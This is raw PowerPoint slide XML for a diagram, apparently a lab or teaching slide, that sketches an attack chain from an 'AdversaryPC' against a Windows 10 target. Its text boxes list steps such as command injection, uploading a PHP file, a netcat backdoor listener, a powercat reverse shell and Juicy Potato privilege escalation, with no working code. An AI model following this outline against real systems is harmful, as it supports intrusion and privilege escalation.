        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="56" name="四角形: 角を丸くする 55">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F0DDF8C-470C-4F67-A05B-07709E02BA74}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="57" name="グループ化 56">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53168D32-9AF4-4E83-B7AC-00B85A44622D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671765" y="2478280"/>
              <a:ext cx="7763550" cy="486758"/>
              <a:chOff x="2671765" y="2478280"/>
              <a:chExt cx="7763550" cy="486758"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="58" name="四角形: 角を丸くする 57">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83F25E00-5139-4C54-B93F-4B5B0FB25CEC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671765" y="2520750"/>
                <a:ext cx="1967592" cy="444288"/>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100" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Delivery</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1100" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="59" name="テキスト ボックス 58">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{912BF64E-8F53-40E3-8F37-3D9EA8F9AA1D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776111" y="2478280"/>
                <a:ext cx="5659204" cy="307777"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t> </a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="矢印: 右 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1E9C788-B005-410E-9DA0-6944AC95C6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3895386" y="3632590"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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8" name="テキスト ボックス 67">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E1B6A82E-58DD-4024-A508-58F42401F021}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1732847" y="3564742"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Nc.exe , jp.exe</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> create injection php </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="テキスト ボックス 68">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5F10A2A-A24F-444A-988B-AD2090DD4051}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1741194" y="5259518"/>
            <a:ext cx="4387181" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>upload php file</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="70" name="グループ化 69">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45F20B05-FBCF-4518-96B7-2BFA4EBE199A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6644390" y="189418"/>
            <a:ext cx="4749018" cy="495740"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="71" name="四角形: 角を丸くする 70">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D5AFFD2-83DA-4F17-AE79-4092D31F3A2F}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2472065" y="3278783"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="72" name="四角形: 角を丸くする 71">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AF37AC1-3947-4ED7-A3CE-86E366416A4F}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>
              <a:ext cx="1967591" cy="444288"/>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200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Initial Access</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="73" name="テキスト ボックス 72">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F5D71BD-FF8F-45D6-8CC5-D531E349EBCF}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394" cy="523220"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>ssh,netcat</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> connection</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>command injection</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="テキスト ボックス 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C705EF42-E8D0-488E-B0D4-DAD87043883E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="77895" y="83351"/>
            <a:ext cx="6873267" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>TARGET</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows10</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="矢印: 右 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F81642-675B-4299-A96C-D8B010E3E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16741087">
            <a:off x="4296713" y="3665607"/>
            <a:ext cx="4207996" cy="321232"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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6" name="矢印: 右 65">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CC54F5E-B2B0-45FF-B502-5E70B6111BDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8942890" y="3562621"/>
            <a:ext cx="4329966" cy="261811"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">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5" name="テキスト ボックス 74">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAE13DC7-33E9-4C8C-846C-2B82A0FCB0F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693988" y="3570257"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>download and use nc64.exe</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    set backdoor(shell listener)</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Rverse</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> shell(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>powercat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="テキスト ボックス 75">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0294BDEE-6625-4BDA-A1D7-97C12E683760}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6805560" y="5341174"/>
            <a:ext cx="4387181" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Use Juicy Potato</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="419532134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 name="四角形: 角を丸くする 63">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F84F164-B51C-48DE-8866-B963762B669E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="4549258"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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3" name="四角形: 角を丸くする 62">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F294152-A6CE-4600-B182-615C662A69E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="3018330"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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2" name="四角形: 角を丸くする 61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E89D79B4-3DCA-4877-8F4D-54456BA650A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="1455343"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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1" name="四角形: 角を丸くする 60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C53EDB0-60AB-4110-814A-3CA3D3E415D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1468545" y="4574823"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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0" name="四角形: 角を丸くする 59">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEFF2B5F-A462-4595-ACA7-86BA8E8DB2A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1538161" y="3004765"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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8" name="四角形: 角を丸くする 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12DAA20C-4E27-4E82-9EDC-874E7D263C87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="1432950"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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22" name="グループ化 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42988117-EB1A-4DE9-B9C7-C66D6313DD55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="328601" y="1320203"/>
            <a:ext cx="2039711" cy="1045029"/>
            <a:chOff x="639988" y="987878"/>
            <a:chExt cx="2039711" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="21" name="グループ化 20">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6605FE0D-B6A5-4872-B38B-C9420253B64C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="639988" y="987878"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="639988" y="987878"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="9" name="四角形: 角を丸くする 8">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20A5D123-2648-46C4-91C6-7D217A6A2D87}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="639988" y="987878"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0B"/>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二等辺三角形 9">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F55D6590-8BEF-4C54-A519-9C00E9FD11B1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="871310" y="1747157"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0B"/>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正方形/長方形 10">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69DDE372-227B-484F-8C89-C32F9237DC30}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="758369" y="1094618"/>
                <a:ext cx="889907" cy="545798"/>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15" name="テキスト ボックス 14">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A6C198F-BEB5-45E6-A5CE-78DE4CE15F22}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="712107" y="1236712"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>AdversaryPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="20" name="グループ化 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A0F568C-FD3E-4960-9019-26D33DA84078}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="10976968" y="5700666"/>
            <a:ext cx="2169661" cy="1045029"/>
            <a:chOff x="8990237" y="5765648"/>
            <a:chExt cx="2169661" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="19" name="グループ化 18">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EA675E4-9A30-4BEE-9EF8-B1692957D861}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8990237" y="5765648"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="8990237" y="5765648"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="12" name="四角形: 角を丸くする 11">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F14B437A-2B0B-44AD-AF71-F1AF5E41D9F2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8990237" y="5765648"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">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二等辺三角形 12">
                <a:extLst>
